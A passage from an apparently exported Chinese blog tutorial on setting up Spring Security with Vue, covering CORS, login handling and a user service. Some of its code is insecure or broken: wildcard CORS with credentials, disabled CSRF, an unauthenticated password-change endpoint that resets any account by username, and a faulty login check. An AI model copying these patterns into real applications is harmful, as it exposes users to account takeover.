class=\"token punctuation\">.</span><span class=\"token constant\">SC_OK</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">PrintWriter</span> writer <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_PERMISSIONS_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_PERMISSIONS_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"跨域\"><a href=\"#跨域\" class=\"headerlink\" title=\"跨域\"></a>跨域</h3><h4 id=\"后端\"><a href=\"#后端\" class=\"headerlink\" title=\"后端\"></a>后端</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Configuration</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CorsConfig</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">WebMvcConfigurer</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">addCorsMappings</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CorsRegistry</span> registry<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        registry<span class=\"token punctuation\">.</span><span class=\"token function\">addMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/**\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">allowedOriginPatterns</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">allowedMethods</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"HEAD\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"PUT\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"DELETE\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"OPTIONS\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">allowCredentials</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">maxAge</span><span class=\"token punctuation\">(</span><span class=\"token number\">3600</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">allowedHeaders</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"vue-两种方式\"><a href=\"#vue-两种方式\" class=\"headerlink\" title=\"vue(两种方式)\"></a>vue(两种方式)</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">axios.defaults.withCredentials <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span> <span class=\"token comment\"># main.js\t</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 创建axios实例</span>\nvar instance <span class=\"token operator\">=</span>  axios.create<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n    baseURL: <span class=\"token string\">'http://localhost:8888/'</span>, <span class=\"token comment\"># 添加基本地址</span>\n    timeout: <span class=\"token number\">1000</span>, <span class=\"token comment\"># 所有请求在超时前等待1秒</span>\n    withCredentials: <span class=\"token boolean\">true</span> <span class=\"token comment\"># 请求的时候携带cookie</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<p>适合单体架构</p>\n<h2 id=\"基本搭建\"><a href=\"#基本搭建\" class=\"headerlink\" title=\"基本搭建\"></a>基本搭建</h2><p>创建SpringBoot项目并且导入SpringSecurity依赖</p>\n<pre class=\"line-numbers language-pom\" data-language=\"pom\"><code class=\"language-pom\">&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-security&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;2.6.8&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>导入图形验证码依赖</p>\n<pre class=\"line-numbers language-pom\" data-language=\"pom\"><code class=\"language-pom\">&lt;dependency&gt;\n    &lt;groupId&gt;com.github.whvcse&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;easy-captcha&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;1.6.2&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h3 id=\"创建配置类\"><a href=\"#创建配置类\" class=\"headerlink\" title=\"创建配置类\"></a>创建配置类</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Configuration</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SecurityConfigurerAdapter</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">WebSecurityConfigurerAdapter</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">configure</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpSecurity</span> http<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">csrf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">disable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">cors</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Customizer</span><span class=\"token punctuation\">.</span><span class=\"token function\">withDefaults</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//解决跨域问题。cors 预检请求放行,让Spring security 放行所有preflight request（cors 预检请求）</span>\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">authorizeRequests</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">requestMatchers</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CorsUtils</span><span class=\"token operator\">::</span><span class=\"token function\">isPreFlightRequest</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">permitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">formLogin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">failureHandler</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">LoginFailHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">successHandler</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">LoginSuccessHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">loginProcessingUrl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/user/login\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">authorizeRequests</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">antMatchers</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/user/captcha\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/user/register\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/user/alterPwd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">permitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">anyRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">authenticated</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">exceptionHandling</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 自定义权限受限403处理</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">accessDeniedHandler</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">MyAccessDeniedHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 处理器模式，自由度更广</span>\n\n        <span class=\"token comment\">// .accessDeniedPage(\"/forbidden.html\"); // 直接返回一个页面。不和上面的同时使用</span>\n        \n        http<span class=\"token punctuation\">.</span><span class=\"token function\">logout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">logoutUrl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/user/logout\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"实现登录逻辑\"><a href=\"#实现登录逻辑\" class=\"headerlink\" title=\"实现登录逻辑\"></a>实现登录逻辑</h3><p>创建登录逻辑类并实现UserDetailService,重写他的loadUserByUsername方法</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Service</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">UserServiceImpl</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ServiceImpl</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">UserMapper</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">UserService</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">UserDetailsService</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">UserRoleService</span> userRoleService<span class=\"token punctuation\">;</span>\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">RoleService</span> roleService<span class=\"token punctuation\">;</span>\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token class-name\">BCryptPasswordEncoder</span> passwordEncoder<span class=\"token punctuation\">;</span>\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">PermissionService</span> permissionService<span class=\"token punctuation\">;</span>\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">UserPermissionService</span> userPermissionService<span class=\"token punctuation\">;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">R</span> <span class=\"token function\">getUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span> user<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">User</span> querUser <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">selectByUserName</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>user <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_NOT_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_NOT_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>querUser<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_PASSWORD_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_PASSWORD_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n        request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> querUser<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">getUserList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> userList <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">selectList</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> userList<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">PageUtils</span> <span class=\"token function\">getUserPage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> params<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">IPage</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> page <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">page</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">QueryPage</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getPage</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">LambdaQueryWrapper</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">like</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span><span class=\"token operator\">::</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> params<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span>  <span class=\"token class-name\">PageUtils</span><span class=\"token punctuation\">(</span>page<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">R</span> <span class=\"token function\">addUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span> user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">User</span> queryUser <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">getUserByUserName</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>queryUser <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token class-name\">String</span> password <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">String</span> encodePassword <span class=\"token operator\">=</span> passwordEncoder<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        user<span class=\"token punctuation\">.</span><span class=\"token function\">setPassword</span><span class=\"token punctuation\">(</span>encodePassword<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">REGISTER_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">REGISTER_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">editUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span> user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">updateById</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">deleteUserById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span> id<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">deleteById</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token annotation punctuation\">@Transactional</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">R</span> <span class=\"token function\">alterPwdByUserName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span> user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">User</span> userByUserName <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">getUserByUserName</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>userByUserName <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_NOT_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_NOT_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token class-name\">String</span> password <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">String</span> encodePassword <span class=\"token operator\">=</span> passwordEncoder<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        user<span class=\"token punctuation\">.</span><span class=\"token function\">setPassword</span><span class=\"token punctuation\">(</span>encodePassword<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">alterPwdByUserName</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token 